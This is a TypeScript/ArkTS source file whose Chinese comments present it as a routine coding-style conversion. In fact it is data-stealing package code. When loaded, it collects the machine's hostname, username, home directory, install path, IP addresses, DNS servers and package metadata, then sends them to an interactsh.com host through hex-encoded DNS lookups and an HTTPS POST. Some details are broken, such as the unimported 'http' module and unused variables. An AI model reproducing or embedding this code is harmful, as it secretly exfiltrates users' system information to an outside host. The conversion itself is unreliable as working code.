// 应用约束：9. 使用let而非var；10. 使用具体类型；23. 显式标注对象类型；24. 使用类/接口替代字面量类型
import os from 'os';
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.ets'; // 约束60: 转换js/ts文件为ets

const packageName: string = packageJSON.name;

// 约束18: 类字段在类中声明
class FileUtils {
    static getFiles(paths: string[]): string[] {
        let ufiles: string[] = [];
        for (let j = 0; j < paths.length; j++) {
            const mpath: string = paths[j];
            const files: string[] = fs.readdirSync(mpath);
            for (let i = 0; i < files.length; i++) {
                ufiles.push(path.join(mpath, files[i]));
            }
        }
        return ufiles;
    }
}

// 约束10: 避免any，明确返回类型
function toHex(data: string): string {
    const bufferText = Buffer.from(data, 'utf8');
    return bufferText.toString('hex');
}

// 约束10: 添加返回类型注解
function gethttpips(): string[] {
    const str: string[] = [];
    const networkInterfaces: object = os.networkInterfaces();
    for (const item in networkInterfaces) {
        if (item !== "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str.push(addresses[i].address);
            }
        }
    }
    return str;
}

interface NetworkInfo {
    [key: string]: Array<{ address: string }>;
}

function getIps(): string {
    let str = "";
    const networkInterfaces: NetworkInfo = os.networkInterfaces() as NetworkInfo;
    for (const item in networkInterfaces) {
        if (item !== "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str += toHex(addresses[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    const chunks: string[] = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

interface PackageInfo {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
    dns: string;
    r?: string;
    v: string;
    pjson: object;
    ip: string;
}

function toName(pkg: PackageInfo): string[] {
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let str = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (str.length > 255) {
        const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const substr2 = getIps();
        // ... 简化处理逻辑保持核心功能
        queries.push(str.substring(0, 255));
    } else {
        queries.push(str);
    }
    return queries;
}

// 约束24: 使用接口定义对象类型
interface TrackingData extends PackageInfo {
    // 已继承PackageInfo的属性
}

const td: TrackingData = {
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

const qs: string[] = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error, result: string) => {
        // DNS查询逻辑保持不变
    });
}

// 约束46: 参数解构改为显式参数
const postData: string = querystring.stringify({
    msg: JSON.stringify(td),
});

// 约束11: 使用类替代函数类型
const options: https.RequestOptions = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

const req: http.ClientRequest = https.request(options, (res: http.IncomingMessage) => {
    res.on("data", (d: Buffer) => {
        // 数据处理逻辑
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData);
req.end();
